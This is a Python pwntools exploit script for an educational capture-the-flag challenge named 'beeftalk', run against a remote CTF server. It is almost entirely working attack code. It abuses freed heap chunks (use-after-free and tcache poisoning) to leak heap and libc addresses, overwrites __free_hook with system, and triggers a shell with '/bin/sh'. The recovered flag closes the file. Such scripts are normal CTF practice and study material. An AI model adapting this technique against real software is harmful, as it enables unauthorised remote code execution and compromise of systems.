from pwn import *

# context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"

# io = gdb.debug("./beeftalk_bin_new", "c")
io = remote("edu-ctf.zoolab.org", 30207)


def login(token: bytes):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"token: ", token)


def signup(name: bytes, desc: bytes, job: bytes, money: int) -> bytes:
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"name ?", name)
    io.sendlineafter(b"desc ?", desc)
    io.sendlineafter(b"job ?", job)
    io.sendlineafter(b"money", str(money).encode())
    io.sendlineafter(b"(y/n) > ", b"y")
    io.recvuntil(b"token: ")
    return io.recvline().strip()


def updateinfo(name: bytes, desc: bytes, job: bytes, money: int):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"Name: ", name)
    io.sendlineafter(b"Desc: ", desc)
    io.sendlineafter(b"Job: ", job)
    io.sendlineafter(b"Money: ", str(money).encode())


def delacc():
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"(y/n) > ", b"y")


def logout():
    io.sendlineafter(b"> ", b"4")


# 0x100 > 0x20, ensure there are unsorted bin on heap
toks = [signup(b"a" * 0x100, b"peko", b"miko", 35) for _ in range(8)]
for tok in toks:
    login(tok)
    delacc()

# tcache 0x50: desc3 -> user2 -> desc2 -> user1 -> desc1 -> user0 -> desc0

# leak heap addr
login(toks[1])
io.recvuntil(b"Hello ")
user0_addr = int.from_bytes(io.recvn(6), "little")
print(f"{user0_addr = :#x}")
logout()

# userlast = desc3
# desclast = user2
toks.append(signup(b"aaaaaa", b"fubuki", b"ayame", 35))


# leak libc (offsets are found using gdb)
login(toks[-1])
updateinfo(b"asd", p64(user0_addr + 0xE10), b"test", 35)
logout()
login(toks[2])
io.recvuntil(b"Hello ")
libc_base = int.from_bytes(io.recvn(6), "little") - 0x1EBBE0
print(f"{libc_base = :#x}")
logout()

freehook = libc_base + 0x1EEB28
system = libc_base + 0x55410

# write system to freehook
login(toks[-1])
updateinfo(b"asd", p64(freehook) + p64(user0_addr + 0x500), b"test", 35)
logout()
login(toks[2])
updateinfo(p64(system), b"perfect", b"nene", 7777)
logout()

login(toks[-1])
updateinfo(b"/bin/sh", b"/bin/sh", b"/bin/sh", 0)
delacc()

io.interactive()

# FLAG{beeeeeeOwO}
